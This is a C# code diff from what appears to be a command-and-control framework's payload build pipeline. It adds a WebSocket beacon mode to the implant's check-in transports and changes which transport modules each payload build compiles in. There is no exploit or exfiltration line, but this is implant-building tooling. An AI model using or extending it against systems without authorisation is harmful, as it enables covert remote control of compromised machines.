@@ -1,12 +1,26 @@
 namespace Rod.BuildPipeline.PayloadBuild;
 
 /// <summary>
+/// The check-in mode wire values a build profile bakes (the same strings the
+/// implant's Config normalizes): "stream" holds a connection open, "poll"
+/// cycles. The web URL shape splits by it -- stream dials the WebSocket
+/// beacon, poll runs the envelope POST cycle.
+/// </summary>
+public static class CheckInModes
+{
+    public const string Stream = "stream";
+    public const string Poll = "poll";
+}
+
+/// <summary>
 /// The check-in modules a build compiles in (architecture.md Sec 8): the
-/// envelope POST cycle for web-front entries (a schemed http(s) beacon URL)
-/// and the mTLS gRPC stream for bare host:port entries. The egress walk the
-/// profile bakes decides the set -- an artifact carries exactly the
-/// transports its walk can dial, so a web-shaped build ships no gRPC client
-/// and a pure-stream build ships no web cycle.
+/// envelope POST cycle for web-front entries on a poll-mode bake, the
+/// WebSocket stream for web-front entries on a stream-mode bake, and the
+/// mTLS gRPC stream for bare host:port entries. The egress walk the profile
+/// bakes decides the shapes and the baked mode picks the web client -- an
+/// artifact carries exactly the transports its walk and mode can dial, so a
+/// poll web build ships no WebSocket client and a stream web build ships no
+/// POST cycle.
 /// </summary>
 [Flags]
 public enum CheckInModules
@@ -15,7 +29,8 @@ public enum CheckInModules
 
     /// <summary>
     /// The envelope POST cycle client (the implant's EnvelopeBeacon): serves
-    /// walk entries whose beacon URL is a schemed http(s) front.
+    /// walk entries whose beacon URL is a schemed http(s) front on a
+    /// poll-mode bake.
     /// </summary>
     Web = 1,
 
@@ -24,6 +39,13 @@ public enum CheckInModules
     /// entries whose beacon URL is a bare host:port.
     /// </summary>
     Stream = 2,
+
+    /// <summary>
+    /// The WebSocket stream client (the implant's WsBeacon): serves walk
+    /// entries whose beacon URL is a schemed http(s) front on a stream-mode
+    /// bake -- the web posture's interactive tier.
+    /// </summary>
+    WebSocket = 4,
 }
 
 /// <summary>
@@ -65,6 +87,13 @@ public static class TransportModuleSelection
         "Internal/StreamCheckIn.cs",
     };
 
+    // The WebSocket stream module's whole source files (the client and its
+    // factory ride one file), relative to the implant tree root.
+    private static readonly string[] WebSocketModuleFiles =
+    {
+        "Internal/WsBeacon.cs",
+    };
+
     // The generated selection replaces this checked-in stub, relative to the
     // implant tree root. The stub names both modules so the dev tree runs
     // against either URL shape.
@@ -76,11 +105,13 @@ public static class TransportModuleSelection
     /// derived from the enroll endpoint -- the same value
     /// <c>RenderBakedProfile</c> bakes as <c>beaconURL</c>) plus each
     /// fallback's derived URL, classified by the implant's own web-or-bare
-    /// rule. A walk that can cross shapes (a stream primary with web
-    /// fallbacks) keeps both clients, so no bake ever strands the artifact
-    /// on an entry it cannot dial.
+    /// rule, with the baked mode splitting the web shape -- stream dials the
+    /// WebSocket beacon, poll runs the envelope POST cycle. A walk that can
+    /// cross shapes (a stream primary with web fallbacks) keeps every client
+    /// it can dial, so no bake ever strands the artifact on an entry it
+    /// cannot run.
     /// </summary>
-    public static CheckInModules Select(TransportProfile profile)
+    public static CheckInModules Select(TransportProfile profile, string mode)
     {
         var modules = CheckInModules.None;
         Consider(profile.BeaconEndpoint ?? DotNetBuildUnit.BeaconUrlFromEnroll(profile.Endpoint));
@@ -91,7 +122,7 @@ public static class TransportModuleSelection
         void Consider(string beaconUrl)
         {
             if (IsWebBeaconUrl(beaconUrl))
-                modules |= CheckInModules.Web;
+                modules |= mode == CheckInModes.Stream ? CheckInModules.WebSocket : CheckInModules.Web;
             else
                 modules |= CheckInModules.Stream;
         }
@@ -129,21 +160,28 @@ public static class TransportModuleSelection
             foreach (var file in WebModuleFiles)
                 File.Delete(Path.Combine(stagingDir, file));
         }
+        if ((modules & CheckInModules.WebSocket) == 0)
+        {
+            foreach (var file in WebSocketModuleFiles)
+                File.Delete(Path.Combine(stagingDir, file));
+        }
 
         File.WriteAllText(Path.Combine(stagingDir, SelectionFile), RenderSelection(modules));
     }
 
     // Renders the per-build TransportSelection: same shape as the checked-in
     // stub, naming only the compiled factories. The implant's Program hands
-    // this array to its check-in coordinator, which picks per URL shape at
-    // run time -- with one module compiled the pick is constant, with two
-    // (a shape-crossing walk) it follows the walk exactly as the dev tree
-    // does.
+    // this array to its check-in coordinator, which picks per URL shape and
+    // mode at run time -- with one module compiled the pick is constant, with
+    // several (a shape-crossing walk) it follows the walk exactly as the dev
+    // tree does.
     private static string RenderSelection(CheckInModules modules)
     {
         var factories = new List<string>();
         if ((modules & CheckInModules.Web) != 0)
             factories.Add("        WebCheckIn.Create(setup),");
+        if ((modules & CheckInModules.WebSocket) != 0)
+            factories.Add("        WsCheckIn.Create(setup),");
         if (NeedsGrpcClient(modules))
             factories.Add("        StreamCheckIn.Create(setup),");
         return
